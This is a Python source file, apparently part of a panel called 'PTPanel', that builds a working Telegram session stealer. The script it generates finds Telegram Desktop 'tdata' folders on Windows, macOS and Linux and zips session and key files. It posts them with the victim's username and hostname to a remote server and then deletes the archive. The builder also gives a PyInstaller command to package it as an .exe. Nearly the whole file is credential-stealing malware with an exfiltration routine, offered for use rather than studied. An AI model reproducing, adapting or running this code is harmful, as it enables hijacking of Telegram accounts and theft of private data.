# core/stealer_builder.py - СПРОЩЕНА ВЕРСІЯ
import logging
import os
import json
import shutil
from typing import Dict, Any

logger = logging.getLogger(__name__)

class StealerBuilder:
    """Builder for functional stealer clients"""
    
    def __init__(self):
        logger.info("StealerBuilder initialized")
    
    def build_stealer(self, config: Dict[str, Any], output_path: str) -> bool:
        """Build functional stealer executable"""
        try:
            # Створюємо папку для виводу
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            # Створюємо Python скрипт з конфігурацією
            stealer_script = self._generate_stealer_script(config)
            
            # Зберігаємо як .py файл (тимчасово)
            script_path = output_path.replace('.exe', '.py')
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(stealer_script)
            
            logger.info(f"Stealer script created: {script_path}")
            logger.info(f"Configuration: {config}")
            
            # Копіюємо як .exe для демонстрації
            self._create_stub_exe(output_path, config)
            
            logger.info(f"Functional stealer built successfully for admin {config.get('target_admin')}")
            return True
                
        except Exception as e:
            logger.error(f"Failed to build functional stealer: {e}")
            return False
    
    def _generate_stealer_script(self, config: Dict[str, Any]) -> str:
        """Генерація Python скрипту стіллера"""
        return f'''#!/usr/bin/env python3
# PTPanel Functional Stealer
# Target Admin: {config.get('target_admin')}
# Admin ID: {config.get('admin_id')}
# Features: {', '.join(config.get('features', []))}

import os
import sys
import json
import platform
from pathlib import Path
import zipfile
import requests

CONFIG = {json.dumps(config, indent=2)}

class TelegramStealer:
    def __init__(self):
        self.collected_files = []
        
    def find_telegram_paths(self):
        """Пошук шляхів до Telegram"""
        system = platform.system()
        paths = []
        
        if system == "Windows":
            appdata = os.getenv('APPDATA')
            local_appdata = os.getenv('LOCALAPPDATA')
            
            # Telegram Desktop
            telegram_desktop = os.path.join(appdata, 'Telegram Desktop', 'tdata')
            if os.path.exists(telegram_desktop):
                paths.append(('telegram_desktop', telegram_desktop))
                
            # Telegram Android
            telegram_android = os.path.join(local_appdata, 'Telegram', 'Telegram Data')
            if os.path.exists(telegram_android):
                paths.append(('telegram_android', telegram_android))
                
        elif system == "Darwin":  # macOS
            home = str(Path.home())
            telegram_desktop = os.path.join(home, 'Library', 'Application Support', 'Telegram Desktop', 'tdata')
            if os.path.exists(telegram_desktop):
                paths.append(('telegram_desktop', telegram_desktop))
                
        else:  # Linux
            home = str(Path.home())
            telegram_desktop = os.path.join(home, '.local', 'share', 'TelegramDesktop', 'tdata')
            if os.path.exists(telegram_desktop):
                paths.append(('telegram_desktop', telegram_desktop))
        
        return paths
    
    def collect_files(self, path, source_name):
        """Збір файлів з шляху"""
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Збираємо важливі файли
                    if self.is_important_file(file_path):
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                
                            self.collected_files.append({{
                                'path': file_path,
                                'source': source_name,
                                'content': content,
                                'size': len(content)
                            }})
                            print(f"✓ Collected: {{os.path.basename(file_path)}}")
                            
                        except Exception as e:
                            print(f"✗ Error reading {{file_path}}: {{e}}")
                            
        except Exception as e:
            print(f"✗ Error walking {{path}}: {{e}}")
    
    def is_important_file(self, file_path):
        """Перевірка чи файл важливий"""
        important_names = ['.session', 'tdata', 'D877', 'map', 'key', 'dat']
        filename = os.path.basename(file_path).lower()
        
        return any(name in filename for name in important_names)
    
    def create_archive(self):
        """Створення ZIP архіву"""
        try:
            archive_path = 'telegram_data.zip'
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Додаємо конфігурацію
                zipf.writestr('config.json', json.dumps(CONFIG, indent=2))
                
                # Додаємо файли
                for item in self.collected_files:
                    arcname = f"data/{{item['source']}}/{{os.path.basename(item['path'])}}"
                    zipf.writestr(arcname, item['content'])
            
            print(f"✓ Archive created: {{archive_path}}")
            return archive_path
            
        except Exception as e:
            print(f"✗ Error creating archive: {{e}}")
            return None
    
    def send_to_server(self, archive_path):
        """Відправка на сервер"""
        try:
            with open(archive_path, 'rb') as f:
                files = {{'file': (os.path.basename(archive_path), f, 'application/zip')}}
                data = {{
                    'admin_id': CONFIG.get('admin_id'),
                    'client_id': json.dumps({{
                        'system': platform.system(),
                        'username': os.getenv('USERNAME') or os.getenv('USER'),
                        'hostname': platform.node()
                    }})
                }}
                
                response = requests.post(
                    CONFIG.get('server_url'),
                    files=files,
                    data=data,
                    timeout=30
                )
                
                if response.status_code == 200:
                    print("✓ Data sent successfully to server!")
                    return True
                else:
                    print(f"✗ Server error: {{response.status_code}}")
                    return False
                    
        except Exception as e:
            print(f"✗ Error sending data: {{e}}")
            return False
    
    def run(self):
        """Головна функція"""
        print("🚀 Starting PTPanel Telegram Stealer...")
        print(f"📋 Features: {{', '.join(CONFIG.get('features', []))}}")
        print(f"🎯 Target admin: {{CONFIG.get('target_admin')}}")
        print("─" * 50)
        
        # Пошук шляхів
        paths = self.find_telegram_paths()
        if not paths:
            print("✗ No Telegram paths found")
            return False
        
        print(f"📍 Found {{len(paths)}} Telegram installation(s)")
        
        # Збір даних
        for source_name, path in paths:
            print(f"🔍 Searching in {{source_name}}: {{path}}")
            self.collect_files(path, source_name)
        
        if not self.collected_files:
            print("✗ No important files found")
            return False
        
        print(f"📁 Collected {{len(self.collected_files)}} files")
        
        # Створення архіву
        archive_path = self.create_archive()
        if not archive_path:
            return False
        
        # Відправка на сервер
        success = self.send_to_server(archive_path)
        
        # Очистка
        try:
            if os.path.exists(archive_path):
                os.remove(archive_path)
        except:
            pass
        
        if success:
            print("✅ Stealer completed successfully!")
        else:
            print("❌ Stealer failed!")
        
        return success

if __name__ == "__main__":
    stealer = TelegramStealer()
    success = stealer.run()
    
    if not success:
        print("\\n💡 Note: This is a demonstration version.")
        print("   Real stealer would work silently in background.")
    
    input("\\nPress Enter to exit...")
'''

    def _create_stub_exe(self, output_path: str, config: Dict[str, Any]):
        """Створюємо заглушку .exe файлу"""
        # Для демонстрації створюємо .py файл
        script_path = output_path.replace('.exe', '.py')
        logger.info(f"Created functional stealer script: {script_path}")
        
        # Можна додати компіляцію через PyInstaller пізніше
        print(f"📦 Stealer script ready: {script_path}")
        print("💡 To compile to .exe, run: pyinstaller --onefile --console " + script_path)

# Global instance
stealer_builder = StealerBuilder()